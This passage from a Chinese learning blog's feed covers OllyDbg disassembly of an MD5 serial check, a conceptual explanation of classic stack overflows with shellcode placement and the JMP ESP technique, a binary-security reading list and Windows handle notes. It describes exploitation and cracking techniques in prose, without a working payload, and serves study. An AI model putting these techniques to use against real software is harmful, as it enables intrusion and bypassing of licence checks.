6F     mov     eax, dword ptr [esp+6F]</span><br><span class="line">004011D0  |.  8D8C24 280100&gt;lea     ecx, dword ptr [esp+128]</span><br><span class="line">004011D7  |.  895424 18     mov     dword ptr [esp+18], edx</span><br><span class="line">004011DB  |.  51            push    ecx                              ;  MD5 Content</span><br><span class="line">004011DC  |.  894424 20     mov     dword ptr [esp+20], eax</span><br><span class="line">004011E0  |.  E8 CB000000   call    004012B0</span><br></pre></td></tr></table></figure><p>此处跟进004012B0,进行MD5的初始化;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">004012B0  /$  8B4424 04     mov     eax, dword ptr [esp+4]</span><br><span class="line">004012B4  |.  33C9          xor     ecx, ecx</span><br><span class="line">004012B6  |.  8948 14       mov     dword ptr [eax+14], ecx</span><br><span class="line">004012B9  |.  8948 10       mov     dword ptr [eax+10], ecx</span><br><span class="line">004012BC  |.  C700 01234567 mov     dword ptr [eax], 67452301</span><br><span class="line">004012C2  |.  C740 04 89ABC&gt;mov     dword ptr [eax+4], EFCDAB89</span><br><span class="line">004012C9  |.  C740 08 FEDCB&gt;mov     dword ptr [eax+8], 98BADCFE</span><br><span class="line">004012D0  |.  C740 0C 76543&gt;mov     dword ptr [eax+C], 10325476</span><br><span class="line">004012D7  \.  C3            retn</span><br></pre></td></tr></table></figure><p>保存散列值的缓冲区地址；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040122A  |.  51            push    ecx</span><br><span class="line">0040122B  |.  52            push    edx</span><br><span class="line">0040122C  |.  E8 5F010000   call    00401390</span><br></pre></td></tr></table></figure><p>经过call调用，保存在edx中；</p><p>计算MD5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00401231  |.  83C4 14       add     esp, 14</span><br><span class="line">00401234  |.  33C0          xor     eax, eax</span><br><span class="line">00401236  |&gt;  8A8C04 800100&gt;/mov     cl, byte ptr [esp+eax+180]</span><br><span class="line">0040123D  |.  83E1 1F       |and     ecx, 1F</span><br><span class="line">00401240  |.  40            |inc     eax</span><br><span class="line">00401241  |.  83F8 10       |cmp     eax, 10</span><br><span class="line">00401244  |.  8A540C 3C     |mov     dl, byte ptr [esp+ecx+3C]</span><br><span class="line">00401248  |.  889404 0F0300&gt;|mov     byte ptr [esp+eax+30F], dl</span><br><span class="line">0040124F  |.^ 7C E5         \jl      short 00401236</span><br><span class="line">00401251  |.  8D8424 100300&gt;lea     eax, dword ptr [esp+310]</span><br><span class="line">00401258  |.  8D4C24 10     lea     ecx, dword ptr [esp+10]</span><br><span class="line">0040125C  |.  50            push    eax                              ; /String2</span><br><span class="line">0040125D  |.  51            push    ecx                              ; |String1</span><br><span class="line">0040125E  |.  FF15 00604000 call    dword ptr [&lt;&amp;KERNEL32.lstrcmpA&gt;] ; \lstrcmpA</span><br><span class="line">00401264  |.  85C0          test    eax, eax</span><br><span class="line">00401266  |.  75 21         jnz     short 00401289</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;浅谈几种加密算法之Hash算法&quot;&gt;&lt;a href=&quot;#浅谈几种加密算法之Hash算法&quot; class=&quot;headerlink&quot; title=&quot;浅谈几种加密算法之Hash算法&quot;&gt;&lt;/a&gt;&lt;center&gt;浅谈几种加密算法之Hash算法&lt;/center&gt;&lt;/h3&gt;&lt;hr&gt;
      
    
    </summary>
    
    
      <category term="逆向工程" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>经典栈溢出问题</title>
    <link href="http://yoursite.com/2019/07/30/%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2019/07/30/经典栈溢出问题/</id>
    <published>2019-07-30T13:10:54.000Z</published>
    <updated>2019-07-30T16:39:43.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="经典栈溢出问题"><a href="#经典栈溢出问题" class="headerlink" title="经典栈溢出问题"></a><center>经典栈溢出问题</center></h3><hr><p>​    说到二进制安全，肯定避不开栈溢出，今天就拿栈溢出作为开始，讨论一下它的形成与构造。</p><h4 id="1-程序的内存空间"><a href="#1-程序的内存空间" class="headerlink" title="1. 程序的内存空间"></a>1. 程序的内存空间</h4><p>​    首先，先介绍一下应用程序内存空间布局，用一张图来说明，简单粗暴。</p><p><img src="/2019/07/30/经典栈溢出问题/3.1.png" alt></p><p>简单介绍一下就是，每个应用程序都有4个GB的虚拟空间（在windows编程的虚拟内存中介绍了），高1个GB作为内核空间，用户代码无权访问，所有的应用程序共享这部分空间。而低3个GB的空间是用户代码，有stack ，heap ，MMap（存放动态链接库）等等，本文重点介绍stack。</p><p>有关堆，栈在虚拟空间中的概念：</p><p>1.栈自底向上增长，尺寸动态变化，默认临界大小是8M。</p><p>2.Stack和mmap间有个随机偏移量用于防止栈溢出污染mmap。</p><p>3.Mappings区间主要布置动态链接库。</p><p>4.默认进程堆自顶向下增长。</p><hr><h4 id="2-栈帧"><a href="#2-栈帧" class="headerlink" title="2. 栈帧"></a>2. 栈帧</h4><ul><li>栈是一种LIFO的数据结构。</li><li>应用程序有一到多个用户态栈。</li><li>栈自底向上增长，由指令PUSH和POP引起其动态变化。</li><li>局部变量布局在栈中。</li><li>调用函数时参数由栈传递，返回地址也存储于栈中。</li><li>函数调用上下文与局部变量共同组成了栈帧——Stack Frame.</li></ul><p>总结一下：栈帧=局部变量+函数调用上下文</p><p>再简单点的说：栈帧实际上只是一个通俗的说法，关于栈帧的上下界历来有两种说法，一曰以EBP和ESP之间的栈空间视为栈帧，这也是主流说法；一曰以调用参数和ESP之间的栈空间视为栈帧，我个人更倾向于这种说法，因为它便于理解。</p><hr><h4 id="3-经典栈溢出的手法"><a href="#3-经典栈溢出的手法" class="headerlink" title="3. 经典栈溢出的手法"></a>3. 经典栈溢出的手法</h4><p>经典栈溢出的手法概要：</p><ul><li><p>先决条件：栈局部变量可控，存在溢出(strcpy)。</p></li><li><p>通过栈空间精心布局，布置shellcode，并用shellcode起始地址覆盖栈帧的ret addr。</p></li></ul><p>存在的问题：</p><ul><li>Shellcode地址在不同PC上不确定</li><li>每次运行地址都会变化（ASLR）</li></ul><p>拿一个例子说明：</p><p><img src="/2019/07/30/经典栈溢出问题/3.2.png" alt></p><p>出现的问题：</p><ol><li>fread时，指定的长度1024超过了buf尺寸。</li><li>输入数据长度可控，在input.txt中。</li><li>可以精心操纵input.txt，对buf进行溢出布置shellcode、覆盖ret addr。</li><li>当返回的地址可以被控制时，问题就大发了。</li></ol><p>具体如何实现呢：</p><ol><li>确定栈帧布局，计算出buf到ret addr的offset。</li><li>先对buf填充无效数据，通过调试找出buf的首地址并覆盖ret addr。</li><li>用一段shellcode填充buf，这段shellcode会弹一个shell。</li></ol><hr><h4 id="4-you-jump-，i-jump-esp"><a href="#4-you-jump-，i-jump-esp" class="headerlink" title="4. you jump ，i jump esp"></a>4. you jump ，i jump esp</h4><p>以上的栈溢出是存在明显问题的。</p><p>首先就是硬编码buffer地址的缺陷：</p><pre><code>1. 对于不同版本系统来说，硬编码的地址是硬伤。Windows尚有dll装卸引起的“移位”。</code></pre><p>​    2. 在ASLR引入以后，栈每次运行基址都是随机的。</p><p><em>解决方法</em>：</p><p><strong>一般情况下，ESP寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏，函数返回时，ESP所指向的位置恰好是我们所淹没的返回地址的下一个位置。</strong></p><p><img src="/2019/07/30/经典栈溢出问题/3.3.png" alt></p><p>现在问题就转化成了如何寻找“JMP ESP”的字节码地址。</p><p>本质：从内存空间的各个映像中寻觅”JMP ESP”的字节码地址。</p><ul><li><p>对Linux来说：<br>ELF映像本身<br>加载的so</p></li><li><p>对Windows来说：<br>PE映像本身<br>加载的dll</p></li></ul><p>要点：尽量择取具有高稳定性的”JMP ESP”指令的地址。</p><p>以上就是以我目前所学简单介绍一下栈溢出的问题，还有待补充，未完待续…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;经典栈溢出问题&quot;&gt;&lt;a href=&quot;#经典栈溢出问题&quot; class=&quot;headerlink&quot; title=&quot;经典栈溢出问题&quot;&gt;&lt;/a&gt;&lt;center&gt;经典栈溢出问题&lt;/center&gt;&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;​    说到二进制安全，肯定避不开栈溢出，今天就拿栈溢
      
    
    </summary>
    
    
      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>漫漫二进制</title>
    <link href="http://yoursite.com/2019/07/30/%E6%BC%AB%E6%BC%AB%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    <id>http://yoursite.com/2019/07/30/漫漫二进制/</id>
    <published>2019-07-29T16:15:07.000Z</published>
    <updated>2019-07-29T16:26:46.165Z</updated>
    
    <content type="html"><![CDATA[<center><h4 id="我的二进制之路"><a href="#我的二进制之路" class="headerlink" title="我的二进制之路"></a><center>我的二进制之路</center></h4><p><em>当我狠下心想学习二进制安全的时候，可能我已经疯了。</em></p><p>​                                                                                        <em>——写在前面</em></p><hr><p>​    先聊聊其他的，关于二进制安全这一方面，我一开始也刷了很多别人的评论与看法，有从入门到放弃的，有行业顶尖大牛的，褒贬不一。但比较中肯的统一的看法是：入门难，就业难。</p><p>​    诶，人生不易。好不容易，遇到了自己感兴趣的东西，还是坚持一下吧，学习总会是有收获的。就算以后改行了，至少会因为自己为了小小的梦想而努力过高兴吧。</p><p>首先，二进制安全，初衷是什么？</p><p>答案是宏伟的：<strong>拥有getshell任意一台电脑的能力</strong></p><p>（据小道消息透露，“安全就是个失败的方向，而二进制又是失败中的失败”，有点苦涩哈哈哈哈）</p><p>​    好了好了，言归正传，那么如何系统的学习二进制安全呢?</p><p>​    其实我也不知道…</p><p>​    我看了很多别人的说法，还是有点分歧，但有一点是不会变得，那就是最底层的东西，C啊，C++啊，好吧，这些都能变，那汇编呢，机器语言呢，这总不会变了吧。</p><p>​    那就行开始吧。</p><p>​    路漫漫其修远兮，吾将上下而求索。</p><p>​    先贴一张图，<strong>提问的智慧</strong>，感觉还是蛮有意思的</p><p>   <img src="/2019/07/30/漫漫二进制/1.jpeg" alt></p><hr><p>​    这篇文章不聊技术向的问题，就聊个大概的学习路线。</p><ul><li><p>​    学习二进制，最起码的语言要会吧？</p><pre><code>1. x86汇编2. c / c++3. python4. windows编程（可以隶属c / c++）</code></pre><p>以上是我现在看了个一知半解的，以后肯定还要学习其他的，以后再说</p></li><li><p>​    要会二进制，没有一手拿得出手的敲代码能力怎么行？</p><pre><code>1. windows核心编程2. c/c++3. python4. python的灰帽子与自动化运维5. 精通黑客脚本</code></pre></li><li><p>​    学二进制，没有一点系统知识真的好吗？</p><pre><code>1. 深入理解计算机原理2. 深入理解linux内核3. windows内核安全编程4. windows内核的原理与实现5. 操作系统（这门课还挂了，难搞哦~）</code></pre></li><li><p>​    没有技巧，学什么二进制，还不如溜了溜了</p><pre><code>1. reversing C ++2. c++的反汇编与逆向分析3. 软件调试案例4. 黑客攻防技术宝典5. 0day安全6. 漏洞战争-软件漏洞分析技术7. 逆向工程核心原理8. 加密与解密9. IDA Pro权威指南</code></pre></li><li><p>​     学习是死的，总得动手去干吧</p><pre><code>1. 游戏外挂开放艺术2. 捉虫日记3. 黑客面杀4. 恶意代码分析5. 安全软件开发之道6. The Shellcodes Handbook</code></pre></li></ul><p>​    冰山一角。</p><p>​    先列下来这么多，以后有什么继续要学的再慢慢补充。</p><p>​    欢迎大家提出意见，一起交流学习。</p><p>​    关于技术向的干货，慢慢补充。</p><p>​    一边学习，一边思考，一边记录，</p><p>​    <strong>永远保持一颗好奇心</strong>，</p><p>   头发我不要了还不行吗。</p></center>]]></content>
    
    <summary type="html">
    
      
      
        &lt;center&gt;

&lt;h4 id=&quot;我的二进制之路&quot;&gt;&lt;a href=&quot;#我的二进制之路&quot; class=&quot;headerlink&quot; title=&quot;我的二进制之路&quot;&gt;&lt;/a&gt;&lt;center&gt;我的二进制之路&lt;/center&gt;&lt;/h4&gt;&lt;p&gt;&lt;em&gt;当我狠下心想学习二进制安全的时候，可能
      
    
    </summary>
    
    
      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>windows编程之句柄hwnd与hdc的区别</title>
    <link href="http://yoursite.com/2019/07/28/windows%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%8F%A5%E6%9F%84hwnd%E4%B8%8Ehdc%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>http://yoursite.com/2019/07/28/windows编程之句柄hwnd与hdc的区别/</id>
    <published>2019-07-28T03:09:45.000Z</published>
    <updated>2019-07-29T00:48:26.255Z</updated>
    
    <content type="html"><![CDATA[<h3 id="谈谈hdc与hwnd的区别"><a href="#谈谈hdc与hwnd的区别" class="headerlink" title="谈谈hdc与hwnd的区别"></a><center>谈谈hdc与hwnd的区别</center></h3><hr><h4 id="hWnd-与hDC的概念"><a href="#hWnd-与hDC的概念" class="headerlink" title="hWnd 与hDC的概念"></a>hWnd 与hDC的概念</h4><p><strong>hWnd</strong>(Handle of Window，也可以这么说：h是类型描述，表示句柄；wnd是变量对象描述，表示窗口)是窗口句柄，其中包含窗口的属性。例如，窗口的大小、显示位置、父窗口。</p><p><strong>hDC</strong>(Handle to Device Context)是图像的设备描述表，窗口显示上下文句柄，其中可以进行图形显示。</p><p>利用hDC=GetDC(hWnd)，可以获得一个窗口的图形设备描述表。可以通过ReleaseDC()函数释放。</p><p>hWnd句柄是描述一个窗口的形状、位置、大小、是否显示、它的父窗口、兄弟窗口、等等的一组数据结构；<br>hDC句柄是一个实实在在的用于具体表现这个窗口时，需要对这个窗口有个场合来实现的地方。</p><p>hWnd是窗体句柄；hDC是设备场景句柄。<br>hWnd与窗口管理有关；hDC与绘图API（GDI函数）有关。<br>hWnd是windows给窗口发送消息（事件）用的；hDC是把窗口绘制在屏幕上用的。</p><p>有了hWnd，可以使用API的GetDC()函数得到与其相关的hDC：hDC=GetDC(hWnd)。</p><p>hWnd与hDC都是句柄，但是<strong>hWnd是窗口句柄而hDC是设备描述表的句柄</strong>。</p><p>在Windows标编程设计中，使用了大量的句柄来标识对象。一个句柄是指使用的一个唯一的整数值，即一个4字节（64位程序中为8字节）长的数值，来标识应用程序中的不同对象和同类中的不同的实例，例如：一个窗口、按钮、图标、滚动条、输出设备、孔健、文件等。应用程序能通过句柄来访问相应的对象的信息。但是<strong>句柄不是指针，程序不能利用句柄来直接阅读文件中的信息。如果句柄不在I/O文件中，它是毫无用处的。</strong>我们来看看另一个好理解的说法：在进程的地址空间中设一张表，表里头专门保存一些编号和由这个编号对应一个地址，而由那个地址去引用实际的对象，这个编号跟那个地址在数值上没有任何规律性的联系，纯粹是个映射而已。在Windows系统中，这个编号就叫做”句柄”。</p><p>句柄实际上是一种指向某种资源的指针，但与指针又有所不同：HWND是跨进程可见的，而指针从来都是属于某个特定进程的。指针对应着一个数据在内存中的地址，得到了指针就可以自由地修改该数据。Windows并不希望一般程序修改其内部数据结构，因为这样太不安全。所以Windows给每个使用GlobalAlloc等函数声明的内存区域指定一个句柄(本质上仍是一个指针，但不要直接操作它)，平时我们只是在调用API函数时利用这个句柄来说明要操作哪段内存。</p><hr><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>​    HWND hwnd;//窗口句柄<br>​    char szAppName[] = “window1”;</p><p>//创建窗口<br>    hwnd = CreateWindow(szAppName, //窗口类型名<br>            TEXT(“The First Experiment”), //窗口实例的标题<br>            WS_OVERLAPPEDWINDOW, //窗口风格<br>            CW_USEDEFAULT, //窗口左上角位置坐标值x<br>            CW_USEDEFAULT, //窗口左上角位置坐标值y<br>            800, //窗口的宽度<br>            600, //窗口的高度<br>            NULL, //父窗口的句柄<br>            NULL, //主菜单的句柄<br>            hInstance, //应用程序实例句柄<br>            NULL );<br>　　　　//显示窗口<br>    ShowWindow(hwnd, iCmdShow);<br>    UpdateWindow(hwnd);</p><pre><code>static int nWidth, nHeight;HDC hdc;//定义设备环境句柄  HBRUSH hB;//定义画笔句刷</code></pre><p>case WM_LBUTTONDOWN://按下鼠标左键则用户区被刷成灰色<br>            nWidth = GetSystemMetrics(SM_CXFULLSCREEN);  //屏幕宽度<br>            nHeight = GetSystemMetrics(SM_CYFULLSCREEN); //屏幕高度<br>            hdc=GetDC(hwnd);<br>            hB = (HBRUSH)GetStockObject(GRAY_BRUSH);//灰色画刷<br>            SelectObject(hdc, hB);<br>            Rectangle(hdc, 0, 0, nWidth, nHeight);//将用户区重新刷成灰色<br>            DeleteObject(hB);//删除画刷</p><p>​            return 0;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;谈谈hdc与hwnd的区别&quot;&gt;&lt;a href=&quot;#谈谈hdc与hwnd的区别&quot; class=&quot;headerlink&quot; title=&quot;谈谈hdc与hwnd的区别&quot;&gt;&lt;/a&gt;&lt;center&gt;谈谈hdc与hwnd的区别&lt;/center&gt;&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=
      
    
    </summary>
    
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows编程之句柄hwnd详解</title>
    <link href="http://yoursite.com/2019/07/28/windows%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%8F%A5%E6%9F%84hwnd%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/07/28/windows编程之句柄hwnd详解/</id>
    <published>2019-07-28T01:54:21.000Z</published>
    <updated>2019-07-29T16:21:57.993Z</updated>
    
    <content type="html"><![CDATA[<h3 id="深入了解Windows句柄是什么"><a href="#深入了解Windows句柄是什么" class="headerlink" title="深入了解Windows句柄是什么"></a><center>深入了解Windows句柄是什么</center></h3><hr><p>Windows是一个以虚拟内存为基础的操作系统，很多时候，进程的代码和数据并不全部装入内存，进程的某一段装入内存后，还可能被换出到外存，当再次需要时，再装入内存。两次装入的地址绝大多数情况下是不一样的。也就是说，同一对象在内存中的地址会变化。那么，程序怎么才能准确地访问到对象呢？为了解决这个问题，Windows引入了句柄。</p><hr><h4 id="1-虚拟内存结构"><a href="#1-虚拟内存结构" class="headerlink" title="1.虚拟内存结构"></a>1.虚拟内存结构</h4><p>CPU通过寻址来访问内存，32位CPU的寻址宽度度是 0~0xFFFFFFFF ，计算后得到的大小是4G，也就是说可支持的物理内存最大是4G。但在实践过程中，碰到了这样的问题，程序需要使用4G内存，而可用物理内存小于4G，导致程序不得不降低内存占用，这个时候操作系统就会借助磁盘空间来做虚拟的内存空间，把<strong>当前进程不需要的数据放在磁盘上，等到用到的时候，在利用调度算法把所需要的数据从磁盘空间上调度到内存</strong>，虚拟内存就是为了扩大内存的容量，每当我们要运行一个程序的时候经过编译以后形成的仅仅是逻辑上的空间，根本不是可以直接运行的内存空间，所以它还存在一个地址映射的概念。</p><p>为了解决这一问题，CPU引入<strong><em>MMU</em></strong>（内存管理单元）</p><p>MMU的核心思想是利用虚拟地址替代物理地址。CPU寻址时使用虚拟地址，MMU将虚拟地址映射为物理地址，他的引入解决了对物理内存的限制。</p><p>既然有了内存管理单元，就得有内存管理机制——内存分页（Paging）</p><p>它将虚拟地址和物理地址按照固定大小（4K）分割成页(page)和页帧(page frame)，并保证页与页帧的大小相同，所以页的个数必定多于页帧的个数。</p><p>在计算机上有一个页表（page table），就是映射虚拟内存页到物理内存页的，更确切的说是页号到页帧号的映射，而且是一对一的映射。但是问题来了，虚拟内存页的个数 &gt; 物理内存页帧的个数，岂不是有些虚拟内存页的地址永远没有对应的物理内存地址空间？不是的，操作系统是这样处理的。操作系统有个页面失效（page fault）功能。操作系统找到一个最少使用的页帧，让他失效，并把它写入磁盘，随后把需要访问的页放到页帧中，并修改页表中的映射，这样就保证所有的页都有被调度的可能了。</p><p><strong>虚拟内存地址由页号（对应映射到一个页帧）和偏移量组成</strong></p><p>偏移量：就是页（或者页帧）的大小，即这个页（或者页帧）到底能存多少数据。举个例子，有一个虚拟地址它的页号是4，偏移量是20，那么他的寻址过程是这样的：首先到页表中找到页号4对应的页帧号（比如为8），如果页不在内存中，则用失效机制调入页，否则把页帧号和偏移量传给MMU（CPU的内存管理单元）组成一个物理上真正存在的地址，接着就是访问物理内存中的数据了。总结起来说，虚拟内存地址的大小是与地址总线位数相关，物理内存地址的大小跟物理内存条的容量相关。</p><p><img src="/2019/07/28/windows编程之句柄hwnd详解/custom.jpg" alt></p><p>进一步优化，引入TLB（Translation lookaside buffer，页表寄存器缓冲）<br>由上一节可知，页表是被存储在内存中的。我们知道CPU通过总线访问内存，肯定慢于直接访问寄存器的。<br>为了进一步优化性能，现代CPU架构引入了<a href="http://baike.baidu.com/view/129737.html?fromTaglist" target="_blank" rel="noopener">TLB</a>，用来缓存一部分经常访问的页表内容。</p><hr><h4 id="2-什么是句柄"><a href="#2-什么是句柄" class="headerlink" title="2.什么是句柄"></a>2.什么是句柄</h4><p>系统为每个进程在内存中分配一定的区域，用来存放各个句柄，即一个个32位无符号整型值（32位操作系统中）。每个32位无符号整型值相当于一个指针，指向内存中的另一个区域（我们不妨称之为区域A）。而区域A中存放的正是对象在内存中的地址。当对象在内存中的位置发生变化时，区域A的值被更新，变为当前时刻对象在内存中的地址，而在这个过程中，区域A的位置以及对应句柄的值是不发生变化的。这种机制，用一种形象的说法可以表述为：有一个固定的地址（句柄），指向一个固定的位置（区域A），而区域A中的值可以动态地变化，它时刻记录着当前时刻对象在内存中的地址。这样，无论对象的位置在内存中如何变化，只要我们掌握了句柄的值，就可以找到区域A，进而找到该对象。而句柄的值在程序本次运行期间是绝对不变的，我们（即系统）当然可以掌握它。这就是以不变应万变，按图索骥，顺藤摸瓜。</p><p>那么这里我们就要修正一下前面的说法了：通用句柄HANDLE有时候是逻辑指针，大多数时候是结构体指针，特殊句柄如HMENU等是结构体指针。这样第二个问题也解决了。</p><p><img src="/2019/07/28/windows编程之句柄hwnd详解/20131230103702500.png" alt></p><hr><h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a><strong>3.总结</strong></h4><p> 所以，我们可以这样理解Windows句柄：</p><pre><code>数值上，是一个32位无符号整型值（32位系统下）；逻辑上，相当于指针的指针；形象理解上，是Windows中各个对象的一个唯一的、固定不变的ID；作用上，Windows使用句柄来标识诸如窗口、位图、画笔等对象，并通过句柄找到这些对象。</code></pre><p>下面，关于句柄，再交代一些关键性细节：</p><p>1.所谓“唯一”、“不变”是指在程序的<strong>一次运行</strong>中。如果本次运行完，关闭程序，再次启动程序运行，那么这次运行中，同一对象的句柄的值和上次运行时比较，一般是不一样的。</p><p>  其实这理解起来也很自然，所谓“一把归一把，这把是这把，那把是那把，两者不相干”（“把”是形象的说法，就像打牌一样，这里指程序的一次运行）。</p><p>2.句柄是对象生成时系统指定的，<strong>属性是只读的，程序员不能修改句柄</strong>。</p><p>3.不同的系统中，句柄的大小（字节数）是不同的，可以使用sizeof()来计算句柄的大小。</p><p>4.通过句柄，程序员只能调用系统提供的服务（即API调用），<strong>不能像使用指针那样，做其它的事。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;深入了解Windows句柄是什么&quot;&gt;&lt;a href=&quot;#深入了解Windows句柄是什么&quot; class=&quot;headerlink&quot; title=&quot;深入了解Windows句柄是什么&quot;&gt;&lt;/a&gt;&lt;center&gt;深入了解Windows句柄是什么&lt;/center&gt;&lt;/h3&gt;
      
    
    </summary>
    
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows编程</title>
    <link href="http://yoursite.com/2019/07/28/windows%E7%BC%96%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/07/28/windows编程/</id>
    <published>2019-07-28T01:31:37.000Z</published>
    <updated>2019-07-29T03:26:27.981Z</updated>
    
    <content type="html"><![CDATA[<h3 id="windows编程随笔"><a href="#windows编程随笔" class="headerlink" title="windows编程随笔"></a><center>windows编程随笔</center></h3><hr><h4 id="1-从MessageBox开始"><a href="#1-从MessageBox开始" class="headerlink" title="1.从MessageBox开始"></a>1.从MessageBox开始</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span><span class="params">( </span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText, </span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT wType </span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br></pre></td></tr></table></figure><p>观察具体几个参数：</p><p><strong>hWnd</strong>：</p><p>为父窗口<u>句柄</u>，指定该对话框的所有者窗口。如果该参数为空(0/NULL)，则该对话框不属于任何窗口。</p><p><strong>lpText</strong>:</p><p>显示在对话框中的消息。</p><p><strong>lpCaption</strong>：</p><p>在对话框<a href="https://baike.baidu.com/item/标题栏" target="_blank" rel="noopener">标题栏</a>中显示的字符串<a href="https://baike.baidu.com/item/表达式" target="_blank" rel="noopener">表达式</a>。如果该参数为空（vbNullString），则使用默认的“错误”作为对话框的标题。</p><p><strong>wType</strong>：</p><p>指定显示按钮的数目及形式</p><hr><ul><li><h4 id="那么问题出现了，句柄代表的到底是什么"><a href="#那么问题出现了，句柄代表的到底是什么" class="headerlink" title="那么问题出现了，句柄代表的到底是什么"></a>那么问题出现了，句柄代表的到底是什么</h4></li></ul><p><em>简单的来说，句柄就是类似指针的标识</em></p><p>1.windows 之所以要设立句柄，根本上源于<a href="http://baike.baidu.com/view/1082.htm" target="_blank" rel="noopener">内存</a>管理机制的问题—<a href="http://baike.baidu.com/view/1499823.htm" target="_blank" rel="noopener">虚拟地址</a>，简而言之数据的地址需要变动，变动以后就需要有人来记录管理变动，（就好像户籍管理一样），因此系统用句柄来记载数据地址的变更。</p><p>2.更透彻一点地认识句柄，句柄是一种指向<a href="http://baike.baidu.com/view/159417.htm" target="_blank" rel="noopener">指针</a>的<a href="http://baike.baidu.com/view/159417.htm" target="_blank" rel="noopener">指针</a>但是它的属性是只读的。</p><hr><ul><li><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4></li></ul><p>那么一个完整的MessageBox便展现出来了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hinstance, HINSTANCE hprevinstance, PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, </span><br><span class="line">        TEXT(<span class="string">"this is content !"</span>),</span><br><span class="line">               TEXT(<span class="string">"this is title !"</span>),</span><br><span class="line">               MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*WinMain()函数的原型声明</span></span><br><span class="line"><span class="comment">int WINAPI WinMain(</span></span><br><span class="line"><span class="comment">  HINSTANCE hInstance,//当前运行实例句柄</span></span><br><span class="line"><span class="comment">  HINSTANCE hPrevInstance,//前一个实例句柄</span></span><br><span class="line"><span class="comment">  LPSTR lpCmdLine,//指定命令参数行字符串</span></span><br><span class="line"><span class="comment">  int nCmdShow;//指定窗口的显示状态</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">MessageBox函数声明</span></span><br><span class="line"><span class="comment">int MessageBox(</span></span><br><span class="line"><span class="comment">   HWND hWnd,//所属窗口的句柄</span></span><br><span class="line"><span class="comment">   LPCTSTR lpText,//消息字符串</span></span><br><span class="line"><span class="comment">   LPCTSTR lpCaption,//消息框标题字符串</span></span><br><span class="line"><span class="comment">   UNIT uType//消息框的类型</span></span><br><span class="line"><span class="comment">);*/</span></span><br></pre></td></tr></table></figure><hr><ul><li><h4 id="思考"><a href="#思考" class="headerlink" 